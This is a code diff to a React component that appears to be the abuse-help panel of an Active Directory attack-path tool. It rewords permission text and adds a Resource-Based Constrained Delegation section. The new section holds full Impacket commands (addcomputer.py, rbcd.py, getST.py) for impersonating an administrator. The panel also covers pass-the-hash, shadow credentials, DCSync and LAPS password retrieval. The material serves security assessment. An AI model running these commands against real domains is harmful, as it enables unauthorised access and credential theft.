@@ -46,12 +46,11 @@ const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = (
                     </Typography>
 
                     <Typography variant='body2'>
-                        Pass-the-hash can also be done here with{' '}
+                        It can also be done with pass-the-hash using{' '}
                         <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
                             pth-toolkit's net tool
                         </Link>
-                        . If the LM hash is not known it must be replaced with{' '}
-                        <Typography component={'pre'}>ffffffffffffffffffffffffffffffff</Typography>.
+                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                     </Typography>
 
                     <Typography component={'pre'}>
@@ -119,12 +118,11 @@ const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = (
                     </Typography>
 
                     <Typography variant='body2'>
-                        Pass-the-hash can also be done here with{' '}
+                        It can also be done with pass-the-hash using{' '}
                         <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
                             pth-toolkit's net tool
                         </Link>
-                        . If the LM hash is not known it must be replace with{' '}
-                        <Typography component={'pre'}>ffffffffffffffffffffffffffffffff</Typography>.
+                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                     </Typography>
 
                     <Typography component={'pre'}>
@@ -142,7 +140,7 @@ const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = (
                     <Typography variant='body1'> Shadow Credentials attack </Typography>
 
                     <Typography variant='body2'>
-                        To abuse this privilege, use{' '}
+                        To abuse this permission, use{' '}
                         <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                             pyWhisker
                         </Link>
@@ -206,9 +204,41 @@ const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = (
                         </Typography>
                         This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of
                         the TARGETCOMPUTER.
+                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
+                        <Typography variant='body2'>
+                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
+                            computer account can be added with Impacket's addcomputer.py example script:
+                        </Typography>
+                        <Typography component={'pre'}>
+                            {
+                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
+                            }
+                        </Typography>
+                        <Typography variant='body2'>
+                            We now need to configure the target object so that the attacker-controlled computer can
+                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
+                        </Typography>
+                        <Typography component={'pre'}>
+                            {
+                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
+                            }
+                        </Typography>
+                        <Typography variant='body2'>
+                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
+                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
+                        </Typography>
+                        <Typography component={'pre'}>
+                            {
+                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
+                            }
+                        </Typography>
+                        <Typography variant='body2'>
+                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
+                            of the TARGETCOMPUTER.
+                        </Typography>
                         <Typography variant='body1'> Shadow Credentials attack </Typography>
                         <Typography variant='body2'>
-                            To abuse this privilege, use{' '}
+                            To abuse this permission, use{' '}
                             <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                                 pyWhisker
                             </Link>
@@ -228,32 +258,40 @@ const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = (
                 return (
                     <>
                         <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
-                        First, if an attacker does not control an account with an SPN set, a new attacker-controlled
-                        computer account can be added with Impacket's addcomputer.py example script:
+                        <Typography variant='body2'>
+                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
+                            computer account can be added with Impacket's addcomputer.py example script:
+                        </Typography>
                         <Typography component={'pre'}>
                             {
                                 "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                             }
                         </Typography>
-                        We now need to configure the target object so that the attacker-controlled computer can delegate
-                        to it. Impacket's rbcd.py script can be used for that purpose:
+                        <Typography variant='body2'>
+                            We now need to configure the target object so that the attacker-controlled computer can
+                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
+                        </Typography>
                         <Typography component={'pre'}>
                             {
                                 "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                             }
                         </Typography>
-                        And finally we can get a service ticket for the service name (sname) we want to "pretend" to be
-                        "admin" for. Impacket's getST.py example script can be used for that purpose.
+                        <Typography variant='body2'>
+                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
+                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
+                        </Typography>
                         <Typography component={'pre'}>
                             {
                                 "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                             }
                         </Typography>
-                        This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of
-                        the TARGETCOMPUTER.
+                        <Typography variant='body2'>
+                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
+                            of the TARGETCOMPUTER.
+                        </Typography>
                         <Typography variant='body1'> Shadow Credentials attack </Typography>
                         <Typography variant='body2'>
-                            To abuse this privilege, use{' '}
+                            To abuse this permission, use{' '}
                             <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                                 pyWhisker
                             </Link>
@@ -276,8 +314,8 @@ const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = (
                     <Typography variant='body1'> DCSync </Typography>
 
                     <Typography variant='body2'>
-                        The AllExtendedRights privilege grants {sourceName} both the DS-Replication-Get-Changes and
-                        DS-Replication-Get-Changes-All privileges, which combined allow a principal to replicate objects
+                        The AllExtendedRights permission grants {sourceName} both the DS-Replication-Get-Changes and
+                        DS-Replication-Get-Changes-All permission, which combined allow a principal to replicate objects
                         from the domain {targetName}.
                     </Typography>
 
@@ -292,7 +330,7 @@ const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = (
                     <Typography variant='body1'> Retrieve LAPS Passwords </Typography>
 
                     <Typography variant='body2'>
-                        The AllExtendedRights privilege also grants {sourceName} enough privileges, to retrieve LAPS
+                        The AllExtendedRights permission also grants {sourceName} enough permissions, to retrieve LAPS
                         passwords domain-wise.
                     </Typography>
 
